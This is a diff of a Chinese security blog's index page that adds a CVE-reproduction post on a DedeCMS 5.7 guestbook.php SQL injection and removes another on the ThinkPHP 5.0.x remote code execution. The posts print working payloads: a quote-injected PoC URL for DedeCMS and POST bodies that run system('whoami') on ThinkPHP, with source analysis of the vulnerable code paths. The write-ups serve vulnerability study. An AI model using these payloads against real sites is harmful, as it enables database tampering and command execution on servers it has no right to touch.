@@ -66,6 +66,114 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-02-10T15:49:48.012Z" itemprop="datePublished">2020-02-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
+<ol>
+<li>php magic_quotes_gpc=off</li>
+<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
+<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
+<pre><code class="php">if($action==&#39;admin&#39;)
+{
+    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);
+    exit();
+}</code></pre>
+<p><code>/plus/guestbook/edit.inc.php</code></p>
+<pre><code class="php">if($job==&#39;editok&#39;)
+{
+    $remsg = trim($remsg);
+    if($remsg!=&#39;&#39;)
+    {
+        //管理员回复不过滤HTML
+        if($g_isadmin)
+        {
+            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg; 
+            //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;
+        }
+        else
+        {
+            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);
+            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;
+            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
+            $msg = $oldmsg.$remsg;
+        }
+    } 
+    $msg = HtmlReplace($msg, -1);
+    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);
+    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
+    exit();
+}</code></pre>
+<p>其中:</p>
+<pre><code class="php">$msg = HtmlReplace($msg, -1);
+    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre>
+<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
+<pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
+    {
+        foreach($$_request as $_k =&gt; $_v) 
+        {
+            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;
+            else ${$_k} = _RunMagicQuotes($_v);
+        }
+    }</code></pre>
+<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
+<pre><code class="php">function _RunMagicQuotes(&amp;$svar)
+{
+    if(!get_magic_quotes_gpc())
+    {
+        ...
+    }
+    return $svar;
+}</code></pre>
+<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr1x000bv4v03hcp87y0" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-S2-013_S2-014远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -2066,292 +2174,6 @@ POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁
 
 
   
-    <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-01-30T04:19:42.405Z" itemprop="datePublished">2020-01-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captcha
-
-post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
-post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p>
-<p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
-<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
-<p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
-<p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
-<pre><code class="php">protected function __construct($options = [])
-    {
-        foreach ($options as $name =&gt; $item) {
-            if (property_exists($this, $name)) {
-                $this-&gt;$name = $item;
-            }
-        }
-        if (is_null($this-&gt;filter)) {
-            $this-&gt;filter = Config::get(&#39;default_filter&#39;);
-        }
-
-        // 保存 php://input
-        $this-&gt;input = file_get_contents(&#39;php://input&#39;);
-    }</code></pre>
-<p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p>
-<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        ...
-
-        // 解析过滤器
-        $filter = $this-&gt;getFilter($filter, $default);
-
-        if (is_array($data)) {
-            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//命令执行
-            reset($data);
-        } else {
-            $this-&gt;filterValue($data, $name, $filter);
-        }
-
-        ...
-    }</code></pre>
-<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
-<p>接着查找调用method()的地方,下断点</p>
-<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
-<p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
-<p>节选App.php关键内容</p>
-<pre><code class="php">public static function run(Request $request = null)
-    {
-        $request = is_null($request) ? Request::instance() : $request;
-
-        try {
-            ...
-            // 获取应用调度信息
-            $dispatch = self::$dispatch;
-
-            // 未设置调度信息则进行 URL 路由检测
-            if (empty($dispatch)) {
-                $dispatch = self::routeCheck($request, $config);
-            }
-
-            // 记录当前调度信息
-            $request-&gt;dispatch($dispatch);
-
-            // 记录路由和请求信息
-            ...
-            $data = self::exec($dispatch, $config);
-        } catch (HttpResponseException $exception) {
-            $data = $exception-&gt;getResponse();
-        }
-        ...
-    }</code></pre>
-<p>跟进routeCheck</p>
-<pre><code class="php">public static function routeCheck($request, array $config)
-    {
-        $path   = $request-&gt;path();
-        $depr   = $config[&#39;pathinfo_depr&#39;];
-        $result = false;
-
-        // 路由检测
-        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];
-        if ($check) {
-            ...
-            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
-            ...
-        }
-
-        ...
-
-        return $result;
-    }</code></pre>
-<p>跟进check,在获取method时调用了method方法</p>
-<pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)
-    {
-        //检查解析缓存
-        ...
-        $method = strtolower($request-&gt;method());
-        // 获取当前请求类型的路由规则
-       ...
-    }</code></pre>
-<p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p>
-<p>跟进exec瞧一瞧</p>
-<pre><code class="php">protected static function exec($dispatch, $config)
-    {
-        switch ($dispatch[&#39;type&#39;]) {
-            case &#39;redirect&#39;: // 重定向跳转
-                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)
-                    -&gt;code($dispatch[&#39;status&#39;]);
-                break;
-            case &#39;module&#39;: // 模块/控制器/操作
-                $data = self::module(
-                    $dispatch[&#39;module&#39;],
-                    $config,
-                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null
-                );
-                break;
-            case &#39;controller&#39;: // 执行控制器操作
-                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
-                $data = Loader::action(
-                    $dispatch[&#39;controller&#39;],
-                    $vars,
-                    $config[&#39;url_controller_layer&#39;],
-                    $config[&#39;controller_suffix&#39;]
-                );
-                break;
-            case &#39;method&#39;: // 回调方法
-                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
-                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
-                break;
-            case &#39;function&#39;: // 闭包
-                $data = self::invokeFunction($dispatch[&#39;function&#39;]);
-                break;
-            case &#39;response&#39;: // Response 实例
-                $data = $dispatch[&#39;response&#39;];
-                break;
-            default:
-                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);
-        }
-
-        return $data;
-    }</code></pre>
-<p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>时会调用<code>Request::instance()-&gt;param()</code></p>
-<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (empty($this-&gt;mergeParam)) {
-            $method = $this-&gt;method(true);
-            // 自动获取请求变量
-            ...
-            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
-            $this-&gt;mergeParam = true;
-        }
-        ...
-        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
-    }</code></pre>
-<p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p>
-<p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
-<p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
-<p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p>
-<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
-<p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
-<blockquote>
-<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
-</blockquote>
-<p>于是最后的payload是</p>
-<pre><code>http://127.0.0.1/index.php?s=captcha
-
-_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p>
-<p>我们看到<code>Request::param</code>方法</p>
-<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (empty($this-&gt;mergeParam)) {
-            $method = $this-&gt;method(true);
-            // 自动获取请求变量
-            ...
-            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
-            $this-&gt;mergeParam = true;
-        }
-        ...
-        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
-    }</code></pre>
-<p>注意这一个<code>$this-&gt;method(true);</code></p>
-<p><code>Request::method</code></p>
-<pre><code class="php">    public function method($method = false)
-    {
-        if (true === $method) {
-            // 获取原始请求类型
-            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
-        } 
-        ...
-    }</code></pre>
-<p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p>
-<pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (empty($this-&gt;server)) {
-            $this-&gt;server = $_SERVER;
-        }
-        if (is_array($name)) {
-            return $this-&gt;server = array_merge($this-&gt;server, $name);
-        }
-        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
-    }</code></pre>
-<p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p>
-<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (&#39;&#39; != $name) {
-            // 解析name
-            if (strpos($name, &#39;/&#39;)) {
-                list($name, $type) = explode(&#39;/&#39;, $name);
-            } else {
-                $type = &#39;s&#39;;
-            }
-            // 按.拆分成多维数组进行判断
-            foreach (explode(&#39;.&#39;, $name) as $val) {
-                if (isset($data[$val])) {
-                    $data = $data[$val];
-                } else {
-                    // 无输入数据，返回默认值
-                    return $default;
-                }
-            }
-            if (is_object($data)) {
-                return $data;
-            }
-        }
-
-        // 解析过滤器
-        $filter = $this-&gt;getFilter($filter, $default);
-
-        ...
-        return $data;
-    }</code></pre>
-<p>于是有</p>
-<pre><code class="php">http://127.0.0.1/public/index.php?s=captcha
-
-POST:
-
-_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
-<p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p>
-<p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE 漏洞复现/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE 漏洞复现/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr27000uv4v0ev3xbplw" data-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2396,7 +2218,7 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -2407,6 +2229,10 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
         
           <li>
             <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
@@ -2424,10 +2250,6 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD
             <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
           </li>
         
-          <li>
-            <a href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -2440,7 +2262,7 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2020 ccreater<br>
+      &copy; 2021 ccreater<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
